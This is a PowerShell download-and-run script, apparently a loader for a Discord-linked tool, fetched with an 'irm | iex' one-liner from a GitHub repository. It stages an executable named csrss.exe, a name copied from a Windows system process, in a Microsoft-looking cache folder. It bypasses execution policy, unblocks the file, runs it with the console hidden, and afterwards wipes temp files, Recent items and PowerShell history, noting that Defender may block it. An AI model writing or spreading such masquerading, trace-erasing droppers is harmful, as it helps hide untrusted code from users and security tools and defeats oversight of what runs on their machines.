# network.ps1 — download / stage / run / wait / clean
#
# GitHub (one-liner):
#   irm https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/network.ps1 | iex
#
# Local build (from repo):
#   $Local = $true
#   powershell -NoProfile -ExecutionPolicy Bypass -File "deploy\network.ps1"
#   # or:  & ".\deploy\network.ps1"  after setting $Local = $true
#
# Optional overrides (set in the same PowerShell session before run):
#   $ExeUrl = 'https://...'
#   $LocalRoot = 'C:\path\to\build\folder'   # folder with csrss.exe + assets\
#   $Local = $true

$ErrorActionPreference = 'Stop'
try { Set-ExecutionPolicy -Scope Process Bypass -Force -ErrorAction SilentlyContinue } catch {}
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Session overrides (works for both -File and irm | iex)
$useLocal = $false
$localRootOpt = ''
$exeUrlOpt = ''
if ((Test-Path variable:Local) -and $Local) { $useLocal = $true }
if ((Test-Path variable:LocalRoot) -and $LocalRoot) { $localRootOpt = [string]$LocalRoot; $useLocal = $true }
if ((Test-Path variable:ExeUrl) -and $ExeUrl) { $exeUrlOpt = [string]$ExeUrl }

$dir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Caches'
$exe = Join-Path $dir 'csrss.exe'
$tmp = Join-Path $dir ('csrss.' + [guid]::NewGuid().ToString('N').Substring(0, 8) + '.bin')
$cb  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$base = 'https://raw.githubusercontent.com/arxstore/curado/refs/heads/main'
$hdr = @{
    'Cache-Control' = 'no-cache'
    'Pragma'        = 'no-cache'
    'User-Agent'    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ARX/1.0'
}

function Resolve-LocalRoot {
    if ($localRootOpt -and (Test-Path -LiteralPath $localRootOpt)) {
        return (Resolve-Path -LiteralPath $localRootOpt).Path
    }
    $scriptPath = $null
    try {
        if ($PSCommandPath) { $scriptPath = $PSCommandPath }
        elseif ($MyInvocation.MyCommand.Path) { $scriptPath = $MyInvocation.MyCommand.Path }
    } catch {}
    if ($scriptPath) {
        $deployDir = Split-Path -Parent $scriptPath
        $repoRoot = Split-Path -Parent $deployDir
        $candidate = Join-Path $repoRoot 'csrss.exe'
        if (Test-Path -LiteralPath $candidate) { return $repoRoot }
        $candidate = Join-Path $deployDir 'csrss.exe'
        if (Test-Path -LiteralPath $candidate) { return $deployDir }
    }
    return $null
}

$resolvedLocal = $null
if ($useLocal -or $localRootOpt) {
    $resolvedLocal = Resolve-LocalRoot
    if (-not $resolvedLocal) {
        throw 'Local mode: csrss.exe not found. Build first, or set $LocalRoot = "path\to\folder".'
    }
}
# Default = GitHub download (irm | iex on other PCs). Local only when $Local / $LocalRoot is set.

$urls = @("$base/csrss.exe?$cb")
if ($exeUrlOpt) { $urls = @(($exeUrlOpt.TrimEnd('?') + "?$cb")) }

function Hide-Console {
    try {
        if (-not ('ArxHideCon' -as [type])) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class ArxHideCon {
  [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int nCmdShow);
}
'@
        }
        $c = [ArxHideCon]::GetConsoleWindow()
        if ($c -ne [IntPtr]::Zero) { [void][ArxHideCon]::ShowWindow($c, 0) }
    } catch {}
}

function Show-Console {
    try {
        if (-not ('ArxShowCon' -as [type])) {
            Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class ArxShowCon {
  [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int nCmdShow);
}
'@
        }
        $c = [ArxShowCon]::GetConsoleWindow()
        if ($c -ne [IntPtr]::Zero) { [void][ArxShowCon]::ShowWindow($c, 5) }
    } catch {}
}

function Remove-Safe($p, [switch]$Recurse) {
    if (-not $p) { return }
    if (-not (Test-Path -LiteralPath $p)) { return }
    try {
        if ($Recurse) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction Stop }
        else { Remove-Item -LiteralPath $p -Force -ErrorAction Stop }
    } catch {}
}

function Clear-History {
    foreach ($h in @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )) {
        if (Test-Path -LiteralPath $h) {
            try { Clear-Content -LiteralPath $h -Force -ErrorAction SilentlyContinue } catch {}
        }
    }
}

function Get-StagedProcesses {
    $byPath = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -ieq $exe) })
    if ($byPath.Count -gt 0) { return $byPath }

    return @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
        Where-Object {
            $_.CommandLine -and ($_.CommandLine -like "*${exe}*") -and
            ($_.ExecutablePath -notlike '*\System32\csrss.exe') -and
            ($_.ExecutablePath -notlike '*\SysWOW64\csrss.exe')
        })
}

function Clean-AfterClose {
    Get-StagedProcesses | ForEach-Object {
        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
    Start-Sleep -Milliseconds 500

    Remove-Safe $tmp
    Remove-Safe $exe
    Remove-Safe (Join-Path $dir 'assets') -Recurse

    Get-ChildItem -LiteralPath $dir -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^(csrss\.|assets|\.cache|z[0-9a-f]+|x[0-9a-f]+)' -or $_.Name -eq 'csrss.exe' } |
        ForEach-Object { Remove-Safe $_.FullName }

    $legacy = Join-Path $env:LOCALAPPDATA 'Libery32'
    Remove-Safe $legacy -Recurse

    foreach ($root in @($env:TEMP, (Join-Path $env:LOCALAPPDATA 'Temp'))) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        Get-ChildItem -LiteralPath $root -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'network\.ps1|ps-script|arxstore|curado|Libery32|libery32|l32_' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (Test-Path -LiteralPath $recent) {
        Get-ChildItem -LiteralPath $recent -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'powershell|\.ps1|network|curado|Libery32' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    Clear-History
}

function Test-Exe($p) {
    if (-not (Test-Path -LiteralPath $p)) { return $false }
    try {
        $i = Get-Item -LiteralPath $p
        if ($i.Length -lt 200KB) { return $false }
        $b = New-Object byte[] 2
        $s = [IO.File]::OpenRead($p)
        try { [void]$s.Read($b, 0, 2) } finally { $s.Dispose() }
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } catch { return $false }
}

function Test-Splash {
    $splash = Join-Path $dir 'assets\login_splash.png'
    if (-not (Test-Path -LiteralPath $splash)) { return $false }
    try { return ((Get-Item -LiteralPath $splash).Length -gt 64) } catch { return $false }
}

function Copy-LocalBuild([string]$root) {
    $srcExe = Join-Path $root 'csrss.exe'
    if (-not (Test-Exe $srcExe)) {
        throw "Local csrss.exe missing or invalid: $srcExe"
    }
    Remove-Safe $exe
    [IO.File]::Copy($srcExe, $exe, $true)
    if (-not (Test-Exe $exe)) { throw 'failed to stage local csrss.exe' }

    $srcAssets = Join-Path $root 'assets'
    $dstAssets = Join-Path $dir 'assets'
    if (Test-Path -LiteralPath $srcAssets) {
        Remove-Safe $dstAssets -Recurse
        Copy-Item -LiteralPath $srcAssets -Destination $dstAssets -Recurse -Force
    }
}

function Install-AssetsFromGithub {
    $s0 = Join-Path $dir 'assets'
    if (-not (Test-Splash) -or -not (Test-Path -LiteralPath $s0)) {
        $z0 = $null
        $x0 = $null
        try {
            # Expand-Archive requires a .zip extension on Windows PowerShell 5.1
            $z0 = Join-Path $dir ('z' + [guid]::NewGuid().ToString('N').Substring(0, 6) + '.zip')
            Invoke-WebRequest -Uri "$base/assets.zip?$cb" -OutFile $z0 -Headers $hdr -UseBasicParsing -TimeoutSec 90
            if ((Test-Path -LiteralPath $z0) -and ((Get-Item -LiteralPath $z0).Length -gt 64)) {
                $x0 = Join-Path $dir ('x' + [guid]::NewGuid().ToString('N').Substring(0, 6))
                if (Test-Path -LiteralPath $x0) { Remove-Item -LiteralPath $x0 -Recurse -Force -ErrorAction SilentlyContinue }
                Expand-Archive -LiteralPath $z0 -DestinationPath $x0 -Force
                if (Test-Path -LiteralPath $s0) { Remove-Item -LiteralPath $s0 -Recurse -Force -ErrorAction SilentlyContinue }
                $i0 = Join-Path $x0 'assets'
                if (Test-Path -LiteralPath $i0) {
                    Copy-Item -LiteralPath $i0 -Destination $s0 -Recurse -Force
                } else {
                    New-Item -ItemType Directory -Force -Path $s0 | Out-Null
                    Copy-Item (Join-Path $x0 '*') $s0 -Recurse -Force -ErrorAction SilentlyContinue
                }
                Remove-Safe $x0 -Recurse
            }
        } catch {
            Remove-Safe $x0 -Recurse
        } finally {
            Remove-Safe $z0
        }
    }

    if (-not (Test-Path -LiteralPath $s0)) {
        New-Item -ItemType Directory -Force -Path $s0 | Out-Null
    }

    $assetFiles = @(
        'login_splash.png',
        'discord.png',
        'mode_thumb.png',
        '4.png',
        'rx_logo.png'
    )
    foreach ($name in $assetFiles) {
        $dest = Join-Path $s0 $name
        if ((Test-Path -LiteralPath $dest) -and ((Get-Item -LiteralPath $dest).Length -gt 64)) { continue }
        try {
            $u = "$base/assets/$name`?$cb"
            Invoke-WebRequest -Uri $u -OutFile $dest -Headers $hdr -UseBasicParsing -TimeoutSec 60
            if ((Test-Path -LiteralPath $dest) -and ((Get-Item -LiteralPath $dest).Length -lt 64)) {
                Remove-Safe $dest
            }
        } catch { Remove-Safe $dest }
    }

    try {
        $fontDir = Join-Path $s0 'fonts'
        $font = Join-Path $fontDir 'LuckiestGuy-Regular.ttf'
        if (-not (Test-Path -LiteralPath $font)) {
            New-Item -ItemType Directory -Force -Path $fontDir | Out-Null
            Invoke-WebRequest -Uri "$base/assets/fonts/LuckiestGuy-Regular.ttf?$cb" -OutFile $font -Headers $hdr -UseBasicParsing -TimeoutSec 60
            if ((Test-Path -LiteralPath $font) -and ((Get-Item -LiteralPath $font).Length -lt 64)) {
                Remove-Safe $font
            }
        }
    } catch {}
}

$launched = $false
try {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    Get-StagedProcesses | ForEach-Object {
        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
    }
    Start-Sleep -Milliseconds 300
    Remove-Safe $exe
    Remove-Safe $tmp

    if ($resolvedLocal) {
        Write-Host ("ARX local stage from: " + $resolvedLocal) -ForegroundColor Cyan
        Copy-LocalBuild $resolvedLocal
    } else {
        $ok = $false
        $lastErr = 'download failed'
        foreach ($url in $urls) {
            for ($n = 1; $n -le 3; $n++) {
                try {
                    Remove-Safe $tmp
                    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -Headers $hdr -TimeoutSec 180
                    if (Test-Exe $tmp) {
                        Remove-Safe $exe
                        [IO.File]::Copy($tmp, $exe, $true)
                        Remove-Safe $tmp
                        if (-not (Test-Exe $exe)) { throw 'copy to staged path failed' }
                        $ok = $true
                        break
                    }
                    $sz = 0
                    if (Test-Path -LiteralPath $tmp) { $sz = (Get-Item -LiteralPath $tmp).Length }
                    $lastErr = "bad file ($sz bytes) from download"
                    Remove-Safe $tmp
                } catch {
                    $lastErr = $_.Exception.Message
                    Start-Sleep -Seconds 1
                }
            }
            if ($ok) { break }
        }
        if (-not $ok) { throw $lastErr }
        # Assets are embedded in csrss.exe — optional overlay download (never required).
        try { Install-AssetsFromGithub } catch {}
    }

    Unblock-File -LiteralPath $exe -ErrorAction SilentlyContinue
    $s0 = Join-Path $dir 'assets'
    if (Test-Path -LiteralPath $s0) {
        Get-ChildItem -LiteralPath $s0 -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue
        }
    }

    $proc = Start-Process -FilePath $exe -WorkingDirectory $dir -PassThru
    if ($null -eq $proc) { throw 'Start-Process returned null' }

    $alive = $false
    for ($i = 0; $i -lt 40; $i++) {
        Start-Sleep -Milliseconds 150
        $p = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if ($p) { $alive = $true; break }
        if ((Get-StagedProcesses).Count -gt 0) { $alive = $true; break }
    }
    if (-not $alive) {
        $code = 'n/a'
        try { if ($proc.HasExited) { $code = "$($proc.ExitCode)" } } catch {}
        throw "exe did not stay running (exit=$code). Defender may have blocked csrss.exe"
    }
    $launched = $true

    if (-not $resolvedLocal) {
        Hide-Console
    }

    try {
        Wait-Process -Id $proc.Id -ErrorAction Stop
    } catch {
        $empty = 0
        while ($empty -lt 3) {
            Start-Sleep -Seconds 1
            $p = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
            $staged = Get-StagedProcesses
            if ((-not $p) -and ($staged.Count -eq 0)) { $empty++ } else { $empty = 0 }
        }
    }
    Start-Sleep -Milliseconds 800

    Clean-AfterClose
}
catch {
    if (-not $launched) {
        Show-Console
        Write-Host ''
        Write-Host ('ARX launch failed: ' + $_.Exception.Message) -ForegroundColor Red
        Write-Host 'Local:  $Local = $true; powershell -File deploy\network.ps1' -ForegroundColor Yellow
        Write-Host 'Remote: upload network.ps1 + csrss.exe + assets.zip then irm | iex' -ForegroundColor Yellow
        Write-Host ''
        try { Read-Host 'Press Enter to close' } catch {}
    } else {
        try { Clean-AfterClose } catch {}
    }
}
